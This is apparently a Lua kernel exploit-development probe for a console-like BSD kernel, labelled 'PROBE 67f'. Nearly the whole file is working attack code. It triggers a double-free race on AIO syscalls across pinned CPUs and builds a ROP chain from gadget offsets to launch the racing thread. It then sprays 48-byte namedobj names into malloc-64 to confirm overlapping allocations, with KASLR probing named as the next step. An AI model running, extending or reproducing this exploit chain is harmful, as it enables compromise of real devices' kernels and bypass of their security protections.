-- CRASH_CLASS: MODERATE
-- PROBE 67f: Cross-zone spray via namedobj names in malloc-64
--
-- The 662 double-free puts malloc-64 blocks on the free list twice.
-- Namedobj names (48B) also use malloc(48, type, flags) → malloc-64.
-- If they share the zone, we can detect overlap:
--
-- Plan:
--   1. Double-free AIO tracking structures → addresses on malloc-64 free list ×2
--   2. Create namedobj objects with known 48-byte names → reclaim one copy
--   3. Submit AIO requests → tracking structures reclaim the OTHER copy
--   4. Now namedobj name and AIO tracking structure share an address!
--   5. Lookup namedobj by original name → if FAILS, AIO overwrote the name
--   6. For KASLR: probe the corrupted name byte-by-byte

print("=== PROBE 67f: CROSS-ZONE NAMEDOBJ ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi) wd(addr, lo or 0); wd(addr + 4, hi or 0) end
local function sgn(v) local l = N(v); if l >= 0x80000000 then l = l - 0x100000000 end; return l end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0

local function g(off) return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off)) end
local function g_lohi(off)
    local lo = eb_lo + off; local hi2 = eb_hi
    if lo >= 0x100000000 then hi2 = hi2 + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi2
end
local pop_rax_ret = g(0x992); local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D); local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64); local mov_rdi_rax = g(0x92C67)
local bare_ret = g(0x42); local sf_lo, sf_hi = g_lohi(0x992)

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(uint64(N(sa) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local pin_mask = memory.alloc(8)
local function set_cpu_mask(mask) wq(pin_mask, uint64(mask))
    pcall(function() mk(488)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(pin_mask))) end) end

local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000); wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8); wq(tcb_ptr, uint64(tcb_mid))
local shared = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do wd(N(shared) + i, 0) end

local reqs = memory.alloc(0x30); local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8); local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0)); wq(uint64(N(reqs) + 8), uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function() mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id))) end)
    return rd(N(one_id)) or 0
end

local function poll_664(id) wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0 end
local function delete_one(id) wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD end

local function spawn_662_child(ids_addr, count, states_addr, done_off)
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local sp = ((cbase + 0x800) - ((cbase + 0x800) % 16)) - 8
    local function push(val) wq(sp, val); sp = sp + 8 end
    push(uint64(165)); push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr))); push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0)); push(stub)
    push(pop_rax_ret); push(uint64(662)); push(pop_rdi_ret); push(uint64(ids_addr))
    push(pop_rsi_ret); push(uint64(count)); push(pop_rdx_ret); push(uint64(states_addr))
    push(pop_rcx_ret); push(uint64(0)); push(stub)
    push(pop_rdi_ret); push(uint64(N(shared) + done_off + 8)); push(mov_rdi_rax)
    push(pop_rdi_ret); push(uint64(N(shared) + done_off))
    push(pop_rax_ret); push(uint64(0xDDDD)); push(mov_rdi_rax)
    push(pop_rax_ret); push(uint64(431)); push(pop_rdi_ret); push(uint64(0)); push(stub)
    wd(N(shared) + done_off, 0)
    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa) + 0x18, 0x800, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)
end

-- =============================================
-- [A] CONTROL: namedobj create + lookup works
-- =============================================
print("")
print("-- [A] CONTROL: namedobj create/lookup --")

local sc_create = mk(557)
local sc_lookup = mk(540)
local sc_delete = mk(558)

-- Create a namedobj with a known name
local test_name = put_str("CTRL_TEST_67f_AAAAAAAAAA")
local ok_c, h_c = pcall(function() return sc_create(test_name, uint64(0)) end)
local ctrl_h = ok_c and N(h_c) or -1
print(string.format("  create: h=0x%X", ctrl_h))

-- Lookup by the same name
local ok_l, h_l = pcall(function() return sc_lookup(test_name, uint64(0)) end)
local lkup_h = ok_l and N(h_l) or -1
print(string.format("  lookup: h=0x%X (expect 0x%X)", lkup_h, ctrl_h))

-- Delete
if ctrl_h > 0 then pcall(function() sc_delete(uint64(ctrl_h)) end) end

if lkup_h ~= ctrl_h then
    print("  ★ namedobj lookup BROKEN — cannot use for overlap detection")
    print("alive=" .. (alive() and "YES" or "NO"))
    print("=== 67f DONE ===")
    return
end
print("  namedobj create/lookup works!")

-- =============================================
-- [B] DOUBLE-FREE RACE
-- =============================================
print("")
print("-- [B] DOUBLE-FREE (mask=0x03) --")
set_cpu_mask(3)

local BATCH = 16
local ids = memory.alloc(BATCH * 4)
local id_list = {}
for i = 0, BATCH - 1 do
    local id = submit_one(); if id == 0 then break end
    wd(N(ids) + i * 4, id); id_list[#id_list + 1] = id
end

local poll_buf = memory.alloc(BATCH * 4)
pcall(function() mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_buf))) end)

local main_st = memory.alloc(BATCH * 4)
local child_st = memory.alloc(BATCH * 4)
for i = 0, BATCH * 4 - 1, 4 do wd(N(main_st) + i, 0xCD); wd(N(child_st) + i, 0xCD) end

spawn_662_child(N(ids), BATCH, N(child_st), 0x100)
pcall(function() mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_st))) end)
for w = 1, 200000 do end

local doubles = 0
for i = 0, BATCH - 1 do
    local ms = rd(N(main_st) + i * 4) or 0xCD
    local cs = rd(N(child_st) + i * 4) or 0xCD
    if ms == 0 and cs == 0 then doubles = doubles + 1 end
end
print("doubles=" .. doubles)
if doubles < 2 then print("Aborting"); print("=== 67f DONE ==="); return end

-- =============================================
-- [C] CREATE NAMEDOBJ — reclaim one copy of double-freed blocks
-- =============================================
print("")
print("-- [C] CREATE NAMEDOBJ (reclaim from one CPU) --")
-- Pin to CPU 0 to drain CPU 0's free list
set_cpu_mask(1)

local NOBJ = 64
local obj_handles = {}
local obj_names = {}
for i = 1, NOBJ do
    -- 20-byte names (short enough to be < 32B with NUL → malloc-32 not malloc-64)
    -- Wait — we need 33-64 byte names to hit malloc-64!
    -- The name string length + NUL + struct overhead must be 33-64B
    -- namedobj might store just the name string (no struct around it)
    -- Try 48-byte names (well within malloc-64 range)
    local name = string.format("OBJ67f_%02d_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", i)
    -- Ensure exactly 48 bytes including NUL (47 chars + NUL = 48)
    name = name:sub(1, 47)
    local name_ptr = put_str(name)
    local ok_cr, h_cr = pcall(function() return sc_create(name_ptr, uint64(0)) end)
    local h = ok_cr and N(h_cr) or -1
    if h > 0 then
        obj_handles[#obj_handles + 1] = h
        obj_names[#obj_names + 1] = {name = name, ptr = name_ptr, handle = h}
    end
end
print("  created: " .. #obj_handles)

-- Verify lookups work
local lookup_ok = 0
for _, o in ipairs(obj_names) do
    local ok_lk, h_lk = pcall(function() return sc_lookup(o.ptr, uint64(0)) end)
    if ok_lk and N(h_lk) == o.handle then lookup_ok = lookup_ok + 1 end
end
print("  lookup_ok: " .. lookup_ok .. "/" .. #obj_names)

-- =============================================
-- [D] SUBMIT AIO — reclaim the OTHER copy
-- =============================================
print("")
print("-- [D] SUBMIT AIO (reclaim from other CPU) --")
-- Pin to CPU 1 to drain CPU 1's free list
set_cpu_mask(2)

local aio_ids = {}
for i = 1, 128 do
    local id = submit_one(); if id == 0 then break end
    aio_ids[#aio_ids + 1] = id
end
print("  aio_submitted: " .. #aio_ids)

-- =============================================
-- [E] LOOKUP NAMEDOBJ — did AIO overwrite names?
-- =============================================
print("")
print("-- [E] LOOKUP NAMEDOBJ AFTER AIO SPRAY --")
local lookup_fail = 0
local lookup_still_ok = 0
for _, o in ipairs(obj_names) do
    local ok_lk, h_lk = pcall(function() return sc_lookup(o.ptr, uint64(0)) end)
    local h = ok_lk and N(h_lk) or -1
    if h == o.handle then
        lookup_still_ok = lookup_still_ok + 1
    else
        lookup_fail = lookup_fail + 1
        if lookup_fail <= 10 then
            print(string.format("  ★ OVERWRITTEN: %s h=0x%X got=%d",
                o.name:sub(1,20), o.handle, h))
        end
    end
end
print(string.format("  lookup_ok=%d fail=%d", lookup_still_ok, lookup_fail))

if lookup_fail > 0 then
    print("")
    print("★★★ CROSS-ZONE OVERLAP CONFIRMED ★★★")
    print("namedobj names and AIO tracking structures share malloc-64!")
end

-- =============================================
-- [F] REVERSE TEST — also try: create namedobj AFTER AIO double-free spray
-- =============================================
if alive() and lookup_fail == 0 then
    print("")
    print("-- [F] REVERSE: AIO first, namedobj second --")
    -- Delete the first batch of namedobj
    for _, h in ipairs(obj_handles) do pcall(function() sc_delete(uint64(h)) end) end

    -- Do another double-free
    set_cpu_mask(3)
    local ids2 = memory.alloc(BATCH * 4)
    for i = 0, BATCH - 1 do
        local id = submit_one(); if id == 0 then break end
        wd(N(ids2) + i * 4, id)
    end
    pcall(function() mk(664)(uint64(N(ids2)), uint64(BATCH), uint64(N(poll_buf))) end)
    for i = 0, BATCH * 4 - 1, 4 do wd(N(main_st) + i, 0xCD); wd(N(child_st) + i, 0xCD) end
    spawn_662_child(N(ids2), BATCH, N(child_st), 0x180)
    pcall(function() mk(662)(uint64(N(ids2)), uint64(BATCH), uint64(N(main_st))) end)
    for w = 1, 200000 do end
    local d2 = 0
    for i = 0, BATCH - 1 do
        local ms = rd(N(main_st) + i * 4) or 0xCD
        local cs = rd(N(child_st) + i * 4) or 0xCD
        if ms == 0 and cs == 0 then d2 = d2 + 1 end
    end
    print("  doubles2=" .. d2)

    if d2 >= 2 then
        -- Pin CPU 0, submit AIO (reclaim one copy)
        set_cpu_mask(1)
        local aio2 = {}
        for i = 1, 64 do
            local id = submit_one(); if id == 0 then break end
            aio2[#aio2 + 1] = id
        end

        -- Pin CPU 1, create namedobj (reclaim other copy)
        set_cpu_mask(2)
        local obj2_handles = {}
        local obj2_names = {}
        for i = 1, 64 do
            local name = string.format("RV67f_%02d_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", i)
            name = name:sub(1, 47)
            local np = put_str(name)
            local ok_cr, h_cr = pcall(function() return sc_create(np, uint64(0)) end)
            local h = ok_cr and N(h_cr) or -1
            if h > 0 then
                obj2_handles[#obj2_handles + 1] = h
                obj2_names[#obj2_names + 1] = {name = name, ptr = np, handle = h}
            end
        end
        print("  created2: " .. #obj2_handles)

        -- Lookup
        local ok2 = 0; local fail2 = 0
        for _, o in ipairs(obj2_names) do
            local ok_lk, h_lk = pcall(function() return sc_lookup(o.ptr, uint64(0)) end)
            if ok_lk and N(h_lk) == o.handle then ok2 = ok2 + 1
            else fail2 = fail2 + 1
                if fail2 <= 5 then
                    print(string.format("  ★ OVERWRITTEN2: %s", o.name:sub(1,20)))
                end
            end
        end
        print(string.format("  lookup2: ok=%d fail=%d", ok2, fail2))

        if fail2 > 0 then
            print("★★★ CROSS-ZONE OVERLAP CONFIRMED (reverse) ★★★")
        end

        -- Cleanup
        for _, h in ipairs(obj2_handles) do pcall(function() sc_delete(uint64(h)) end) end
        for _, id in ipairs(aio2) do poll_664(id); delete_one(id) end
    end
end

-- =============================================
-- [G] CLEANUP
-- =============================================
if alive() then
    print("")
    print("-- [G] CLEANUP --")
    for _, h in ipairs(obj_handles) do pcall(function() sc_delete(uint64(h)) end) end
    for _, id in ipairs(aio_ids) do poll_664(id); delete_one(id) end
    print("done")
end

print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67f DONE ===")
